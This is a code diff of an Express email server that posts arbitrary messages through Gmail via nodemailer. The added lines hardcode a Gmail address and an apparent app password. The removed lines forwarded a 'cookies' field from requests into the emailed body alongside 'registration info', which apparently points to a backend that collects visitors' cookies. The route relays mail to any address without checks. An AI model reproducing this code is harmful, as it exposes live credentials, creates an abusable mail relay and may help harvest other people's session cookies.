@@ -1,81 +1,84 @@
+import * as dotenv from 'dotenv';
+import express from 'express';
+import cors from 'cors';
+import nodemailer from 'nodemailer';
 
-require('dotenv').config();
-const express = require('express');
-const cors = require('cors');
-const nodemailer = require('nodemailer');
-const path = require('path');
+dotenv.config();
+
+const app = express();
+const port = process.env.PORT || 3001;
 
 // Configure email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS
+    user: 'peternnamani001@gmail.com',
+    pass: 'yygzcdttgthuhicg'
   }
 });
 
-const app = express();
-const port = process.env.PORT || 3001;
-
-app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// Serve static files from the frontend build (dist) in production
-// Enable CORS for the frontend
+// Middleware
 app.use(cors({
-  origin: process.env.NODE_ENV === 'production' 
-    ? process.env.FRONTEND_URL 
-    : 'http://localhost:5173',
+  origin: process.env.NODE_ENV === 'production'
+    ? ['https://verify-frontend.netlify.app']  // Production frontend URL
+    : ['http://localhost:5173'],
   credentials: true
 }));
 
-// POST /api/send-email - send registration info to email
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true }));
+
+// Test route
+app.get('/api/test', (req, res) => {
+  res.json({ message: 'Server is running!' });
+});
+
+// Email route
 app.post('/api/send-email', async (req, res) => {
+  console.log('Received email request:', req.body);
   try {
-    console.log('Received request:', req.body);
     const { to, subject, text, html, cookies } = req.body;
     
-    if (!to || !subject) {
-      console.error('Missing required fields');
-      return res.status(400).json({ error: 'Missing required fields' });
-    }
-
-    // Log email configuration (but mask the password)
-    console.log('Email configuration:', {
-      user: process.env.EMAIL_USER,
-      to: to,
-      configured: !!process.env.EMAIL_PASS
-    });
-
-    // Verify connection configuration
-    try {
-      await transporter.verify();
-      console.log('SMTP connection verified');
-    } catch (error) {
-      console.error('SMTP Verification failed:', error);
-      return res.status(500).json({ error: 'Email server connection failed' });
-    }
-    // Add cookies to the email body if present
-    let htmlWithCookies = html;
-    if (cookies) {
-      htmlWithCookies += `<h3>Cookies</h3><div style="background:#f5f5f5;padding:10px;border-radius:4px;">${Array.isArray(cookies) ? cookies.map(c => `<p>${c}</p>`).join('') : cookies}</div>`;
-    }
     const mailOptions = {
-      from: process.env.EMAIL_USER,
+      from: 'peternnamani001@gmail.com',
       to,
       subject,
       text,
-      html: htmlWithCookies,
+      html
     };
-    await transporter.sendMail(mailOptions);
-    res.json({ success: true, message: 'Email sent successfully.' });
+
+    console.log('Sending email with options:', mailOptions);
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Email sent successfully:', info.messageId);
+    
+    res.json({ 
+      success: true, 
+      messageId: info.messageId 
+    });
   } catch (error) {
-    console.error('Error sending email:', error);
-    res.status(500).json({ success: false, message: 'Failed to send email.' });
+    console.error('Email error:', error);
+    res.status(500).json({ 
+      error: 'Failed to send email',
+      details: error.message
+    });
   }
 });
 
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error('Server error:', err);
+  res.status(500).json({ 
+    error: 'Internal server error',
+    details: err.message
+  });
+});
+
+// Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
+  
+  // Test email configuration
+  transporter.verify()
+    .then(() => console.log('Email configuration verified successfully'))
+    .catch(err => console.error('Email configuration error:', err));
 });
